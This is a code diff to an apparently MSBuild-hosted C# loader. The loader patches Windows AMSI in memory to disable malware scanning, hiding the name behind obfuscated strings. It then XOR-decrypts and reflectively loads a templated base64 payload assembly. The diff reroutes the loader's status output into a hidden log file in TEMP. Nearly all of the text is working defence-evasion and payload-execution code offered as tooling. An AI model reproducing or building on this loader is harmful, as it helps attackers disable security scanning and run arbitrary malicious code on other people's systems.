@@ -11,6 +11,7 @@
       <Code Type="Class" Language="cs">
         <![CDATA[
 using System;
+using System.IO;
 using System.Reflection;
 using System.Text;
 using System.Runtime.InteropServices;
@@ -35,7 +36,7 @@ namespace csharp
         {
             Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
         }
-        private static void Thing()
+        private static string Thing()
         {
             try
             {
@@ -59,12 +60,11 @@ namespace csharp
                     CopyData(smallBoyBytes, addr);
 
                 }
-                Console.WriteLine("[+] Patched Ayy Emm Ess Eye!");
+                return "[+] Patched A.M.S.I!";
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[!] Couldn't patch Ayy Emm Ess Eye :(");
-                Console.WriteLine("[!] {0}", ex.Message);
+                return "[!] Couldn't patch A.M.S.I :(\n" + ex.Message;
             }
         }
         private static byte[] Zor(byte[] input, byte[] key)
@@ -78,41 +78,42 @@ namespace csharp
         }
         public static void Main(string[] args)
         {
-            Assembly assembly = null;
-            bool foundMain = false;
-            bool execMain = false;
-
-            Thing();
+            Assembly assem = null;
+            string key = "~~KEY~~";
+            string path = Environment.GetEnvironmentVariable("TEMP") + "\\__" + key + ".txt";
+            StreamWriter writer = File.AppendText(path);
+            writer.AutoFlush = true;
+            Console.SetOut(writer);
+            writer.WriteLine(DateTime.Now.ToString());
+            writer.WriteLine(Thing());
             SetProcessDPIAware();
 
             try
             {
                 string data = "~~ASSEMBLY~~";
-                string key = "~~KEY~~";
-                assembly = Assembly.Load(Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key)));
+                assem = Assembly.Load(Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key)));
             }
             catch (Exception e)
             {
-                Console.WriteLine("[!] Could not load assembly. Returned the following error:\n\n");
-                Console.WriteLine(e);
+                writer.WriteLine("[!] Could not load assembly. Returned the following error:\n\n");
+                writer.WriteLine(e);
                 Environment.Exit(1);
             }
             
             if (args.Length == 0)
             {
-                Console.WriteLine("[*] Running assembly with no arguments");
+                writer.WriteLine("[*] Running assembly with no arguments");
             }
             else
             {
-                Console.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
+                writer.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
             }
             try {
-                var output = assembly.EntryPoint.Invoke(null, new object[] { args });
-                Console.WriteLine(output);
+                assem.EntryPoint.Invoke(null, new object[] { args });
             }
             catch (Exception e) {
-                Console.WriteLine("[!] Could not invoke assembly. Returned the following error:\n\n");
-                Console.WriteLine(e);
+                writer.WriteLine("[!] Could not invoke assembly. Returned the following error:\n\n");
+                writer.WriteLine(e);
                 Environment.Exit(1);
             }
         }
